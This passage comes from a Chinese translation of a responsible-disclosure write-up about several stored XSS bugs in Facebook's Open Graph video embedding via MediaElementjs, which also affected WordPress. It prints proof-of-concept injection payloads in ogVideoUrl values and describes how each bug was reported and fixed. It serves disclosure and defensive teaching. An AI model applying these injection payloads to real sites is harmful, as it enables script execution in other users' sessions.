    http://evil.com/video.flv#"payload
和 o / YEAH !!!!!
现在Flash发送
    setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);
到Facebook的JavaScript和哪些将导致
    log("http://evil.com/video.flv?"[payload]")
所以如果ogVideoUrl设置为
    http://evil.com/video.flv#"+alert(document.domain+" XSSed!")+"
那么Facebook将执行
    log("http://evil.com/video.flv?"+alert(document.domain+" XSSed!")+"")
并会显示一个不错的小警告框，说“facebook.com XSSed！” 🙂
> 这是由于浏览器解析URL时，不同的浏览器在特殊字符编码上有所不同：
>
>   * Firefox将对URL中出现的任何双引号(“)进行URL编码
>   * Chrome浏览器（最高版本为64）将除了URL 的hash部分（=fragment
>   *
> ）外的双引号(“)进行URL编码。（请注意：在Chrome的最新版本65中，此行为已更改，现在Chrome的行为与Firefox相同，在hash中的双引号（”）也会进行编码）
>   * IE和Edge将不会URL编码在hash部分或者URL 的搜索部分（=query）中的双引号
>   * Safari将不会URL编码在hash部分的双引号(“)
>
>
> 正如你所看到的让浏览器决定如何在JavaScript代码中的URL中进行特殊字符编码并不是很好！
我立即将此漏洞报告给Facebook，他们在第二天回复并告诉我他们修改了Flash文件，以便它不再使用setTimeout，Flash现在会发送
    log("http://evil.com/video.flv?\"payload")
正如你所看到的 **“** 正确地转义到 **”** ，所里这里不再有XSS。
## 2.无Flash存储XSS
上面的的XSS需要Flash，所以我检查这里能否有一个不使用Flash的payload。
如果ogVideoType是“video / vimeo”，则会执行以下代码
    ogVideoUrl = absolutizeUrl(ogVideoUrl);ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);playerDiv.innerHTML = '';
正如你可以看到
absolutizeUrl（ogURL）在注入playerDiv.innerHTML之前没有被urlencoded，所以当ogVideoUrl设置为
    http://evil.com/#" onload="alert(document.domain)"
playerDiv.innerHTML则会变为：
这又是Facebook.com上的XSS！
我在前一个XSS被修复的同一天报道了这一点，Facebook在同一天用如下方法修复了漏洞：
    ogVideoUrl = absolutizeUrl(ogVideoUrl);ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);playerDiv.innerHTML = ''
以下是这个XSS的视频：  
您的浏览器不支持video标签﻿  
第二天，我发现了另一个易受攻击的点：当ogVideoType是未知的类型，比如“video /
nothing”时，Facebook会显示一条包含ogVideoUrl链接的错误消息，如下所示：
    errorDiv.innerHTML = ''
所以ogVideoUrl 的payload设置为
    https://opnsec.com/#">`
我把它报告给了Facebook，非常欢乐的是，来自Facebook的白帽子Neil告诉我，他计划在第二天检查这些代码！
## 哦，还有一件事…
另一种可能的ogVideoType是“silverlight”。[Silverlight](https://www.microsoft.com/silverlight/)
是微软公司的浏览器插件，它能与VBscript交互，就像Flash和JavaScript交互。
在Facebook（silverlightmediaelement.xap）上托管的silverlight文件是这样加载的：
    params = ["file=" + ogVideoUrl, "id=playerID"];silverlightDiv.innerHTML ='';
silverlightmediaelement.xap然后会发送日志信息到Facebook的JavaScript（这点有点像Flash），但这次它不包含ogVideoUrl，但只有player
ID，这是另一个在initParams中发送由Facebook定义的参数。Silverlight会调用javascript函数 **[id]
_init（）** ，其中[id]是“playerID”。
在Silverlight中，参数不是由 URLs或Flash中的 **＆** 所分隔，而是通过 **逗号(,)**
如果ogVideoUrl 包含一个 **逗号( ，)** 那么在这个 **逗号**
后面的每一个东西都将被silverlight视为另一个参数，这意味着使用有效载荷
    https://opnsec.com/#,id=alert(document.domain)&
然后silverlight像这样加载：
    silverlightDiv.innerHTML ='';
Silverlight将仅考虑id的第一次出现，并将其值设置为
    alert(document.domain)&
然后Silverlight将调用以下javascript：
    alert(document.domain)&_init()
这意味着再次 XSS！
我在同一天进行了提交，Neal回复说他们将删除所有MediaElement组件，并用一种处理外部视频的新方式替换它！
## 那么WordPress呢？
所有这些存在问题的代码都不是由Facebook开发的，他们使用了可以将视频嵌入到网页中
[MediaElementjs](http://www.mediaelementjs.com/)
库，它是一个流行的（现在依旧是，尤其是因为它们具有支持旧版浏览器的Flash后备功能）开源模块。特别是，WordPress在处理[短代码](https://codex.wordpress.org/Shortcode_API)时默认使用这个模块。这些漏洞也存在于WordPress中，并能够在WordPress评论或作者写的WordPress文章中写入存储XSS（在WordPress中，作者角色不允许执行JavaScript）。
我向WordPress报告了漏洞，几个月之前我已经报告过[其他漏洞](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)
。他们向MediaElementjs团队通报了这一消息，并告诉我他们正在进行修复。在2018年2月，他们终于发布了与MediaElementjs相关的所有XSS的修复程序。
## 结论
我学到了很多东西，并且发现这些漏洞非常有趣。我希望你也喜欢它！
以下是一些建议：
> Open Graph（以及像json-> ld这样的替代品）是在网站上显示丰富的外部内容的好方法，但你应该小心使用（认为SSRF，XSS和Clickjacking）
>
> 不要让浏览器在您的JavaScript代码中为您解析URL，每个浏览器都以自己的方式处理它，并且浏览器可以随时更改其行为（如Chrome 64 – >
> 65）。应该改为使用白名单正则表达式。
>
>
> 现在的自动工具不会检测到使用XHR，DOM突变和外部内容的复杂动态XSS。所以即使是最安全，最有影响力的网站也可能会受到攻击。代码审查和调试是实现这些目标的方法！
>
> 不要害怕大的、压缩过、动态的JavaScript源代码。如果您在网站上发现一些潜在的危险功能，您可以放轻松的检查它是如何实现的。
>
> Facebook WhiteHat是一个非常好的漏洞奖励计划！感谢Neal及其团队